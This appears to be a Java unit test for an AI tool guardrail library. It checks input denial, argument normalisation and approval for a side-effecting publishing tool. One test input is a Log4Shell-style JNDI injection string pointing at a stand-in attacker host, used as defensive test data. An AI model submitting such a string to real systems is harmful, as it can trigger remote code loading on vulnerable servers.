package com.arte.ai.service.tool.security;

import com.arte.ai.api.tool.security.GuardrailDecision;
import com.arte.ai.common.enums.tool.*;
import com.arte.ai.pojo.tool.*;
import org.junit.Test;
import tools.jackson.databind.ObjectMapper;

import java.time.Duration;
import java.time.Instant;
import java.util.Map;
import java.util.Set;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertTrue;

public class FixedToolGuardrailTest {

    @Test
    public void shouldDenyUnsafeInputAndTransformOptedInArguments() {
        GuardrailContext unsafe = context(definition(true, ToolRiskLevelEnum.LOW),
                Map.of("text", "${jndi:ldap://attacker}"), Map.of(), GuardrailPhaseEnum.INPUT);
        GuardrailDecision denied = new UnsafeInputGuardrail(new ObjectMapper())
                .evaluate(unsafe).toCompletableFuture().join();
        assertTrue(denied instanceof GuardrailDecision.Denied);

        GuardrailContext normalizable = context(definition(true, ToolRiskLevelEnum.LOW),
                Map.of("text", "  hello  "), Map.of("tool.normalize-strings", true),
                GuardrailPhaseEnum.INPUT);
        GuardrailDecision changed = new ParameterNormalizationGuardrail()
                .evaluate(normalizable).toCompletableFuture().join();
        assertTrue(changed instanceof GuardrailDecision.Changed);
        GuardrailDecision.Changed transformed = (GuardrailDecision.Changed) changed;
        assertEquals(GuardrailActionEnum.TRANSFORM, transformed.action());
        assertEquals("hello", transformed.changes().get("text"));
    }

    @Test
    public void shouldRequireApprovalForSideEffectingTool() {
        GuardrailContext context = context(definition(false, ToolRiskLevelEnum.MEDIUM),
                Map.of("text", "publish"), Map.of(), GuardrailPhaseEnum.PRE_EXECUTION);

        GuardrailDecision decision = new RiskApprovalGuardrail()
                .evaluate(context).toCompletableFuture().join();

        assertTrue(decision instanceof GuardrailDecision.ApprovalRequired);
    }

    private GuardrailContext context(ToolDefinition definition, Map<String, Object> arguments,
                                     Map<String, Object> attributes, GuardrailPhaseEnum phase) {
        ToolExecutionContext executionContext = new ToolExecutionContext("run", null, null,
                "trace", null, new ToolPrincipal("owner", "owner", Set.of(), Set.of()),
                Instant.now().plusSeconds(30), NeverToolCancellation.INSTANCE,
                null, null, attributes);
        ToolInvocation<DynamicToolRequest> invocation = new ToolInvocation<>("call",
                definition.reference(), new DynamicToolRequest(arguments), executionContext,
                definition.defaultPolicy());
        return new GuardrailContext(phase, definition, invocation, null, Map.of());
    }

    private ToolDefinition definition(boolean readOnly, ToolRiskLevelEnum level) {
        ToolExecutionPolicy policy = new ToolExecutionPolicy(ToolExecutionModeEnum.BLOCKING,
                Duration.ofSeconds(30), 0, Duration.ZERO, 1024, !readOnly, false);
        return new ToolDefinition(new ToolReference("article", "publish", "1.0.0"),
                "Article publishing", "Publish article content after validation.",
                new ToolSchema("json-schema", "{\"type\":\"object\"}"),
                new ToolSchema("json-schema", "{\"type\":\"object\"}"),
                new ToolCapabilities(false, Set.of(ToolExecutionModeEnum.BLOCKING),
                        true, false, Set.of("structured"), Set.of("structured")),
                new ToolRiskProfile(level, readOnly, false, true, true,
                        false, Set.of(), Set.of()), Map.of(), policy, Set.of("article"), false);
    }
}
